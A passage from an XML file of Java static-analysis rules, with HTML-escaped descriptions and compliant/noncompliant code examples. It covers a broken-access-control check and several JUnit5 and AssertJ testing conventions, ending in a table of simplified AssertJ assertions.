            public class MyPermissionEvaluator implements PermissionEvaluator {
            @Override
            public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
            //Getting subject
            Object user = authentication.getPrincipal();

            if(user.getRole().equals(permission)) {
            return true;
            }

            return false; // Compliant
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control&quot;&gt;OWASP
            Top 10 2017 Category A5&lt;/a&gt; - Boken Access Control &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/285.html&quot;&gt;MITRE, CWE-285&lt;/a&gt;
            - Improper Authorization &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a5</tag>
        <securityStandards>
            <OWASP>A5</OWASP>
        </securityStandards>
    </rule>

    <rule key='S5810' priority='MAJOR'>
        <configKey>S5810</configKey>
        <name>JUnit5 test classes and methods should not be silently ignored</name>
        <description>
            &lt;p&gt;JUnit5 is more tolerant regarding the visibilities of Test classes and methods than JUnit4, which
            required everything to be public. JUnit5 supports
            default package, public and protected visibility, even if it is recommended to use the default package
            visibility, which improves the readability of
            code.&lt;/p&gt;
            &lt;p&gt;But JUnit5 ignores without any warning:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; private classes and private methods &lt;/li&gt;
            &lt;li&gt; static methods &lt;/li&gt;
            &lt;li&gt; methods returning a value without being a TestFactory &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;

            class MyClassTest {
            @Test
            private void test1() { // Noncompliant - ignored by JUnit5
            // ...
            }
            @Test
            static void test2() { // Noncompliant - ignored by JUnit5
            // ...
            }
            @Test
            boolean test3() { // Noncompliant - ignored by JUnit5
            // ...
            }
            @Nested
            private class MyNestedClass { // Noncompliant - ignored by JUnit5
            @Test
            void test() {
            // ...
            }
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            import org.junit.jupiter.api.Test;

            class MyClassTest {
            @Test
            void test1() {
            // ...
            }
            @Test
            void test2() {
            // ...
            }
            @Test
            void test3() {
            // ...
            }
            @Nested
            class MyNestedClass {
            @Test
            void test() {
            // ...
            }
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5826' priority='CRITICAL'>
        <configKey>S5826</configKey>
        <name>Methods setUp() and tearDown() should be correctly annotated starting with JUnit4</name>
        <description>
            &lt;p&gt;The &lt;code&gt;setUp()&lt;/code&gt; and &lt;code&gt;tearDown()&lt;/code&gt; methods (initially
            introduced with JUnit3 to execute a block of code before and after each
            test) need to be correctly annotated with the equivalent annotation in order to preserve the same behavior
            when migrating from JUnit3 to JUnit4 or
            JUnit5.&lt;/p&gt;
            &lt;p&gt;This rule consequently raise issues on &lt;code&gt;setUp()&lt;/code&gt; and &lt;code&gt;tearDown()&lt;/code&gt;
            methods which are not annotated in test classes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit4: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public void setUp() { ... } // Noncompliant; should be annotated with @Before
            public void tearDown() { ... } // Noncompliant; should be annotated with @After
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit5: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            public void setUp() { ... } // Noncompliant; should be annotated with @BeforeEach
            public void tearDown() { ... } // Noncompliant; should be annotated with @AfterEach
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit4: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            @Before
            public void setUp() { ... }

            @After
            public void tearDown() { ... }
            &lt;/pre&gt;
            &lt;ul&gt;
            &lt;li&gt; JUnit5: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            @BeforeEach
            void setUp() { ... }

            @AfterEach
            void tearDown() { ... }
            &lt;/pre&gt;
        </description>
        <tag>junit</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5831' priority='MAJOR'>
        <configKey>S5831</configKey>
        <name>AssertJ configuration should be applied</name>
        <description>
            &lt;p&gt;A &lt;code&gt;org.assertj.core.configuration.Configuration&lt;/code&gt; will be effective only once
            you call &lt;code&gt;Configuration.apply()&lt;/code&gt; or
            &lt;code&gt;Configuration.applyAndDisplay()&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when configurations are set without the appropriate call to apply them.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Configuration configuration = new Configuration(); // Noncompliant, this configuration will not be applied.
            configuration.setComparingPrivateFields(true);{code}
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Configuration configuration = new Configuration();
            configuration.setComparingPrivateFields(true);
            configuration.applyAndDisplay();
            // Alternatively: configuration.apply();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://assertj.github.io/doc/#assertj-configuration&quot;&gt;AssertJ
            configuration documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5833' priority='MAJOR'>
        <configKey>S5833</configKey>
        <name>AssertJ methods setting the assertion context should come before an assertion</name>
        <description>
            &lt;p&gt;Describing, setting error message or adding a comparator in &lt;a href=&quot;https://assertj.github.io/doc/&quot;&gt;AssertJ&lt;/a&gt;
            must be done before calling the
            assertion, otherwise, settings will not be taken into account.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when one of the method (with all similar methods):&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;as&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;describedAs&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;withFailMessage&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;overridingErrorMessage&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;usingComparator&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;usingElementComparator&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;extracting&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;filteredOn&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;is called without calling an AssertJ assertion afterward.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(actual).isEqualTo(expected).as(&quot;Description&quot;); // Noncompliant
            assertThat(actual).isEqualTo(expected).withFailMessage(&quot;Fail message&quot;); // Noncompliant
            assertThat(actual).isEqualTo(expected).usingComparator(new CustomComparator()); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            assertThat(actual).as(&quot;Description&quot;).isEqualTo(expected);
            assertThat(actual).withFailMessage(&quot;Fail message&quot;).isEqualTo(expected);
            assertThat(actual).usingComparator(new CustomComparator()).isEqualTo(expected);
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://assertj.github.io/doc/#calling-as-after-the-assertion&quot;&gt;AssertJ
            incorrect usage documentation&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>assertj</tag>
        <tag>tests</tag>
    </rule>

    <rule key='S5838' priority='MINOR'>
        <configKey>S5838</configKey>
        <name>Chained AssertJ assertions should be simplified to the corresponding dedicated assertion</name>
        <description>
            &lt;p&gt;AssertJ contains many assertions methods specific to common types. Both versions will test the same
            things, but the dedicated one will provide a
            better error message, simplifying the debugging process.&lt;/p&gt;
            &lt;p&gt;This rule reports an issue when an assertion can be simplified to a dedicated one.&lt;/p&gt;
            &lt;p&gt;The array below gives a non-exhaustive list of assertion reported by the rule. Code behaving
            similarly, or with a negation will also be
            reported.&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Original&lt;/th&gt;
            &lt;th&gt;Dedicated&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to Object&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getObject()).isEqualTo(null)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getObject()).isNull()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getBoolean()).isEqualTo(true)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getBoolean()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getBoolean()).isEqualTo(false)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getBoolean()).isFalse()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x.equals(y)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isEqualTo(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x == y).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isSameAs(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x == null).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isNull()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x.toString()).isEqualTo(y)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).hasToString(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x.hashCode()).isEqualTo(y.hashCode())&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).hasSameHashCodeAs(y));&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getObject() instanceof MyClass).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getObject()).isInstanceOf(MyClass.class)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;Related to &lt;code&gt;Comparable&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x.compareTo(y)).isZero()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isEqualByComparingTo(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x &amp;gt;= y).isGreaterThanOrEqualTo(0)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isGreaterThanOrEqualTo(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x &amp;gt; y).isPositive()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isGreaterThan(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x &amp;lt;= y).isNotPositive()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isLessThanOrEqualTo(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x &amp;lt; y).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(x).isLessThan(y)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;Related to &lt;code&gt;String&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().isEmpty()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(&lt;/code&gt;&lt;code&gt;getString&lt;/code&gt;&lt;code&gt;()).hasSize(0)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(&lt;/code&gt;&lt;code&gt;getString&lt;/code&gt;&lt;code&gt;()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().equals(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).isEqualTo(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().equalsIgnoreCase(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).isEqualToIgnoringCase(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().contains(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).contains(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().startsWith(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).startsWith(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().endsWith(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).endsWith(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().matches(expected)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).matches(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().trim()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).isBlank()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().length()).isEqualTo(length)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).hasSize(length)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString().length()).hasSize(expected.length())&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getString()).hasSameSizeAs(expected)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to &lt;code&gt;File&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).hasSize(0)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().length()).isZero()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().length()).isEqualTo(length)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).hasSize(length)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().canRead()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).canRead()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().canWrite()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).canWrite()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().exists()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).exists()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().getName()).isEqualTo(name)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).hasName(name)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().getParent()).isEqualTo(pathname)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).hasParent(pathname)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().getParentFile()).isNull()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).hasNoParent()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().isAbsolute()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isAbsolute()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().isAbsolute()).isFalse()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isRelative()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().isDirectory()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isDirectory()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().isFile()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isFile()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile().list()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getFile()).isEmptyDirectory()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to &lt;code&gt;Path&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().startsWith(path)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).startsWithRaw(path)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().endsWith(path)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).endsWithRaw(path)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().getParent()).isEqualTo(name)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).hasParentRaw(name)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().getParent()).isNull()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).hasNoParentRaw()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().isAbsolute()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).isAbsolute()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath().isAbsolute()).isFalse()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getPath()).isRelative()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to &lt;code&gt;Array&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isZero()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isEqualTo(length)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSize(length)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isEqualTo(anotherArray.length)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSameSizeAs(getAnotherArray())&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isLessThanOrEqualTo(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSizeLessThanOrEqualTo(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isLessThan(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSizeLessThan(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isGreaterThan(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSizeGreaterThan(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray().length).isGreaterThanOrEqualTo(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getArray()).hasSizeGreaterThanOrEqualTo(expression)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to &lt;code&gt;Collection&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection().isEmpty()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection().size()).isZero()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection()).isEmpty()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection().contains(something)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection()).contains(something)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection().containsAll(otherCollection)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getCollection()).containsAll(otherCollection)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;&amp;nbsp;Related to &lt;code&gt;Map&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().size()).isEqualTo(otherMap().size()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).hasSameSizeAs(otherMap())&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().containsKey(key)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsKey(key)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().keySet()).contains(key)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsKey(key)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().keySet()).containsOnlyKey(key)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsOnlyKey(key)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().containsValue(value)).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsValue(value)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().values()).contains(value)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsValue(&lt;/code&gt;&lt;code&gt;value&lt;/code&gt;&lt;code&gt;)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap().get(key)).isEqualTo(value)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getMap()).containsEntry(key, value)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;th&gt;Related to &lt;code&gt;Optional&lt;/code&gt;&lt;/th&gt;
            &lt;th&gt;&amp;nbsp;&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional().isPresent()).isTrue()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional()).isPresent()&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional().get()).isEqualTo(something)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional()).contains(something)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional().get()).isSameAs(something)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;assertThat(getOptional()).containsSame(something)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
